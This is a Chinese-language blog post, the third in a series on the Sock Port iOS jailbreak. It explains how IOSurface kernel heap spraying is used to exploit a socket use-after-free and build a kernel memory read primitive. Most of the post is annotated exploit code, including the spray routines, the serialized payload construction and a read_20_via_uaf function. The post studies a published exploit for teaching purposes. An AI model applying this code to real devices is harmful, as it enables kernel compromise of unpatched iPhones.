---
title: Sock Port 漏洞解析（三）IOSurface Heap Spraying
date: 2019-12-01 20:00:00
tags: ['SockPort', 'UAF', 'Heap Spraying', 'IOSurface']
---

# 系列文章
1. [iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying](https://juejin.im/post/5dd10660e51d453fac0a598d)
2. [iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address](https://juejin.im/post/5dd918d051882573180a2ba7)

# 前言
在上一篇文章中，我们介绍了基于 OOL Message 的 Port Address Spraying，这种 Spraying 的局限性很大，只能对已释放区域填充 Port Address。实现 tfp0 的一个关键点是在已释放区域填充任意数据，这就需要我们寻找其他函数作为 Heap Spraying 的工具。

本文将介绍一种基于 IOSurface 的 Heap Spraying 方法，通过该方法能够实现将任意数据喷射到内核指定位置。

# IOSurface 是什么
根据苹果的文档[1]，IOSurface Framework 的功能如下：
> The IOSurface framework provides a framebuffer object suitable for sharing across process boundaries. It is commonly used to allow applications to move complex image decompression and draw logic into a separate process to enhance security.

即 IOSurface.framework 提供了一个跨进程共享的帧缓冲区，它常常用于把复杂的图片解码与绘制逻辑分离到单独的进程以提高安全性。

了解了 IOSurface.framework，接下来根据 iPhone Dev Wiki 给出的描述[2]：
> IOSurface is an object encompassing a kernel-managed rectangular pixel buffer in the IOSurface framework. It is a thin wrapper on top of an IOSurfaceClient object which actually interfaces with the kernel.

从这段描述我们可以提取出有效信息：IOSurface 是一个被内核管理的对象，它是在 IOSurfaceClient 之上的一个封装，既然这个对象被分配到内核的内存区域，我们就有机会利用它实现 Kernel Heap Spraying。

# IOSurface Heap Spraying 使用场景
在[上一篇文章](https://juejin.im/post/5dd918d051882573180a2ba7#heading-7) 的 Sock Port 概览中我们提到可借助 `in6p_outputopts` 成员实现不稳定的内核内存读取和释放，其实现原理是先伪造一个 `in6p_outputopts` 结构体，利用 minmtu 成员作为标志位，再额外利用一个结构体指针 `in6_pktinfo` 赋予我们想要读取的地址，如下所示：
```c
// create a fake struct with our dangling port address as its pktinfo
struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
// give a number we can recognize
fake_opts->ip6po_minmtu = 0x41424344; 
// on iOS 10, minmtu offset is different
*(uint32_t*)((uint64_t)fake_opts + 164) = 0x41424344;
// address to read
fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
```

然后我们利用 Socket UAF 制造大量的已释放 `in6p_outputopts` 区域，随后将上述伪造的数据喷射到 Socket UAF 区域，通过 getsockopt 函数读取 minmtu 确认 Spraying 成功，成功后再通过 getsockopt 读取 `ip6po_pktinfo` 结构体，由于 `ip6po_pktinfo` 的大小为 20B，我们通过这种方式一次性可以读取目标地址的 20B 数据。

不难看出，上述问题的关键在于如何实现 `faked in6p_outputopts` 的 Spraying，而 IOSurface 能够向内核的帧缓冲区发送任意数据，因此非常适合这个场景。

# IOSurface Heap Spraying 详解
首先我们看到 Sock Port 2 提供的 IOSurface 函数：
```c
int spray_IOSurface(void *data, size_t size) {
    return !IOSurface_spray_with_gc(32, 256, data, (uint32_t)size, NULL);
}

bool
IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
	return IOSurface_spray_with_gc_internal(array_count, array_length, 0,
			data, data_size, callback);
}
```

其中 Facade 函数为 `spray_IOSurface`，只需要提供待 Spraying 的数据和大小即可，它是 `IOSurface_spray_with_gc` 的简单封装，提供了对生成的 OSArray 的默认配置，`array_count = 32` 代表生成 32 个 Spraying Array，即进行 32 次 Heap Spraying，而 `array_length = 256` 代表每个数组中包含了 256 个 Spraying Data。

## XML 构造
在 `IOSurface_spray_with_gc_internal` 函数中，首先完成的是 OSSerializeBinary XML 的构造：
```objc
static bool
IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count, void *data, uint32_t data_size, void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
    // 1. 创建一个 IOSurfaceRootClient 对象与内核通信
    // Make sure our IOSurface is initialized.
    bool ok = IOSurface_init();
    if (!ok) {
    	return 0;
    }
    
    // 2. 我们当前的使用方式下 extra_count = 0，因此可以忽略 extra_count
    // How big will our OSUnserializeBinary dictionary be?
    uint32_t current_array_length = array_length + (extra_count > 0 ? 1 : 0);
    
    // 3. 计算 Spraying Data 所需要的 XML 结点数
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    
    // 4. 这里的多个 1 代表除去 Spraying Data 外的固定 XML 结点，后面具体构造会看到
    size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
    
    // 5. 构造传入内核的 args，包含了待构造 xml 与其他描述内容
    // Allocate the args struct.
    struct IOSurfaceValueArgs *args;
    size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
    args = malloc(args_size);
    assert(args != 0);
    // Build the IOSurfaceValueArgs.
    args->surface_id = IOSurface_id;
    // Create the serialized OSArray. We'll remember the locations we need to fill in with our
    
    // 6. 每个 XML 都包含了一个 OSArray 来容纳 Spraying Data
    // 这里的 xml_data 数组即容纳 current_array_length(256) 个 xml_data
    // 每个 xml_data 包含一个 Spraying Data，它由多个 xml 结点组成
    // data as well as the slot we need to set our key.
    uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
    assert(xml_data != NULL);
    uint32_t *key;
    
    // 7. 构造 XML
    size_t xml_size = serialize_IOSurface_data_array(args->xml,
    		current_array_length, data_size, xml_data, &key);
    assert(xml_size == xml_units * sizeof(args->xml[0]));
    // ...
```

上述构造过程较为复杂，总共有 7 个关键步骤，在上面的代码中已通过注释的方式说明，读者可先粗略了解一下整个过程，接下来我们详细分析这些过程。

### XML Spraying 原理
在上述步骤 7 中我们构造了一个装有 256 个 OSString 的 OSArray，其中 OSString 为序列化的 Spraying Data，通过 IOSurfaceRootClient 将 XML 送入内核缓冲区后，内核会为这些 OSString 分配空间，而 OSString 就是我们需要喷射的数据，因此通过这种方式成功的实现了任意数据的 Heap Spraying。

### 关键数据计算
用于 IOSurface 传输的 XML 对象的每个结点都可以用一个 uint32 表示，称为 XML Unit，由于 IOSurface 调用必须指定输入的长度，因此计算好每一轮 Spraying 使用的 XML 大小至关重要。

在步骤 3 中，我们计算了 Spraying Data 对应的 XML Units 数量：
```c
// 3. 计算 Spraying Data 所需要的 XML 结点数
size_t xml_units_per_data = xml_units_for_data_size(data_size);

/*
 * xml_units_for_data_size
 *
 * Description:
 * 	Return the number of XML units needed to store the given size of data in an OSString.
 */
static size_t
xml_units_for_data_size(size_t data_size) {
    return ((data_size - 1) + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}
```

由于序列化数据在内核中被表示为 OSString，所以我们需要考虑结尾的 `\0`，此时只能牺牲数据的最后一位作为 `\0`，因此实际计算的大小为 `size - 1`，接下来的公式就转化为 `(actual_size + n - 1) / n`，这是典型的 Ceiling 函数，即对 actual_size 除以 4(XML Unit Size) 向上取整，最后得到的是每个 Spraying Data 对应的 OSString 所占据的 XML Units Count，并存储在 `xml_units_per_data` 中。

随后在步骤 4 中，我们基于 `xml_units_per_data` 计算了 XML Units Count 的总数：
```c
size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
```

其中 `(1 + xml_units_per_data) * current_array_length` 不难理解，即将 OSString Header + Data 结构重复 `current_array_length` 次后的 Units Count，前后的 3 个 1 均表示额外的描述性 XML Units。

最后在步骤 6 中，我们准备了一个 XML Units 指针数组，用于指向 XML 中待填充 OSString 的 `current_array_length` 个区域的 Child Unit Header：
```c
uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
```

该数组会在 XML 构建过程中使用，将 `current_array_length` 个 OSString 的 Header Unit Address 保存下来，以便接下来将 Spraying Data 拷贝到 XML 中。

### 构造过程
构造的关键在步骤 7 对 `serialize_IOSurface_data_array` 的调用：
```c
#if 0
struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t _out1;
    union {
        uint32_t xml[0];
        char string[0];
    };
};
#endif
struct IOSurfaceValueArgs *args;
size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
args = malloc(args_size);
// 7. 构造 XML
uint32_t *key;
uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
size_t xml_size = serialize_IOSurface_data_array(args->xml, current_array_length, data_size, xml_data, &key);
```

这里的 `args->xml` 即 XML Units 指针，它通过指向一个 XML Header Unit 来引用 XML。

由于前期准备充分，这里的计算并不复杂，只是对 XML 链表的拼接：
```c
static size_t
serialize_IOSurface_data_array(uint32_t *xml0, uint32_t array_length, uint32_t data_size, uint32_t **xml_data, uint32_t **key) {
    uint32_t *xml = xml0;
    *xml++ = kOSSerializeBinarySignature;
    *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    *xml++ = kOSSerializeArray | array_length;
    for (size_t i = 0; i < array_length; i++) {
    	uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
    	*xml++ = kOSSerializeData | (data_size - 1) | flags;
    	xml_data[i] = xml;
    	xml += xml_units_for_data_size(data_size);
    }
    *xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
    *key = xml++; // This will be filled in on each array loop.
    *xml++ = 0;	// Null-terminate the symbol.
    return (xml - xml0) * sizeof(*xml);
}
```

`xml0` 为当前 XML 的 Header Units，我们定义一个 `xml` 变量作为 Cursor，逐步构建 XML，每个 XML Unit 都由一个 uint32 描述，以头部 3 句为例:
```c
*xml++ = kOSSerializeBinarySignature;
*xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
*xml++ = kOSSerializeArray | array_length;
```

它相当于声明了如下 XML 结构：
```xml
<kOSSerializeBinarySignature />
<kOSSerializeArray>2</kOSSerializeArray>
<kOSSerializeArray length=${array_length}>
```

它正好是上文中计算 XML Units Count 的前面 3 个 1。

随后的循环中将 `array_length` 个 OSString 填充到 OSArray 中，并将这些 OSString 的 XML Unit Address 存入 `xml_data` 指针数组：
```c
for (size_t i = 0; i < array_length; i++) {
	uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
	*xml++ = kOSSerializeData | (data_size - 1) | flags;
	xml_data[i] = xml;
	xml += xml_units_for_data_size(data_size);
}
```

这构建了如下的 XML：
```xml
<kOSSerializeBinarySignature />
<kOSSerializeArray>2</kOSSerializeArray>
<kOSSerializeArray length=${array_length}>
    <kOSSerializeData length=${data_size - 1}>
        <!-- xml_data[0] -->
    </kOSSerializeData>
    <kOSSerializeData length=${data_size - 1}>
        <!-- xml_data[1] -->
    </kOSSerializeData>
    <!-- ... -->
    <kOSSerializeData length=${data_size - 1}>
        <!-- xml_data[array_length - 1] -->
    </kOSSerializeData>
</kOSSerializeArray>
```

最后填充的是尾部的 XML Units：
```c
*xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
*key = xml++; // This will be filled in on each array loop.
*xml++ = 0; // Null-terminate the symbol.
```

这里包含了 3 个 Units：
```xml
<kOSSerializeSymbol>${sizeof(uint32_t) + 1}</kOSSerializeSymbol>
<key>${key}</key>
0
```

这也印证了上文 XML Units 计算的尾部的 +3，因此最后得到的 XML 为：
```xml
<kOSSerializeBinarySignature />
<kOSSerializeArray>2</kOSSerializeArray>
<kOSSerializeArray length=${array_length}>
    <kOSSerializeData length=${data_size - 1}>
        <!-- xml_data[0] -->
    </kOSSerializeData>
    <kOSSerializeData length=${data_size - 1}>
        <!-- xml_data[1] -->
    </kOSSerializeData>
    <!-- ... -->
    <kOSSerializeData length=${data_size - 1}>
        <!-- xml_data[array_length - 1] -->
    </kOSSerializeData>
</kOSSerializeArray>
<kOSSerializeSymbol>${sizeof(uint32_t) + 1}</kOSSerializeSymbol>
<key>${key}</key>
0
```

此时 XML 结构已经构建完毕，只需要向 `xml_data` 占位符中填充 Spraying Data，向 key 中填充标识符即可完成组装。

## 组装数据
接下来的代码完成的是数据填充和向内核发送数据，基于上面的讨论很好理解：
```c
// Keep track of when we need to do GC.
static uint32_t total_arrays = 0;
size_t sprayed = 0;
size_t next_gc_step = 0;
// Loop through the arrays.
for (uint32_t array_id = 0; array_id < array_count; array_id++) {
    // If we've crossed the GC sleep boundary, sleep for a bit and schedule the
    // next one.
    // Now build the array and its elements.
    // 1. 生成唯一标识符填充到 key
    *key = base255_encode(total_arrays + array_id);
    for (uint32_t data_id = 0; data_id < current_array_length; data_id++) {
        // Copy in the data to the appropriate slot.
        // 2. 将数据填充到 OSString
        memcpy(xml_data[data_id], data, data_size - 1);
    }
    
    // 3. 向内核发送数据
    // Finally set the array in the surface.
    ok = IOSurface_set_value(args, args_size);
    if (!ok) {
    	free(args);
    	free(xml_data);
    	return false;
    }
    if (ok) {
        sprayed += data_size * current_array_length;
    }
}
```

通过上述代码中标出的 3 个关键步骤即可将组装好的 XML 送入内核帧缓冲区，内核会为其中的 OSString 分配内存，在这个过程中就完成了 Heap Spraying。

# 使用 IOSurface Heap Spraying 实现 kread
通过构造多个悬垂的 `in6p_outputopts`，再以伪造的 `in6p_outputopts` 进行 spraying，将伪造数据结构的 pktinfo 指向待读取地址，minmtu 作为标识符，进行 IOSurface Spraying，随后基于 minmtu 挑选成功 Spraying 的悬垂 `in6p_outputopts` 区域，使用 getsockopt 获取 pktinfo 结构体内容，由于该结构体大小为 20B，我们由此拿到了指定内核地址 20B 的数据：

```c
// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    *(uint32_t*)((uint64_t)fake_opts + 164) = 0x41424344; // on iOS 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] Failed to read kernel\n");
        return 0;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
    close(sockets[found_at]);
    
    return buf;
}
```

# 总结
本文介绍了一种更通用的 Heap Spraying 方案，并介绍了通过该方案实现 kread 的过程和原理。

# 下节预告
通过 IOSurface Spraying 不仅能实现 kread，也可以实现 kfree。在下一篇文章中，我们将介绍通过 kread + kfree 的组合实现 tfp0 的最后几个步骤。

<img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img>

# 参考资料
1. [IOSurface Framework. Apple Document](https://developer.apple.com/documentation/iosurface)
2. [IOSurface. iPhone Dev Wiki](https://iphonedevwiki.net/index.php/IOSurface)
3. [Sock Port 2. jakeajames](https://github.com/jakeajames/sock_port/tree/sock_port_2)
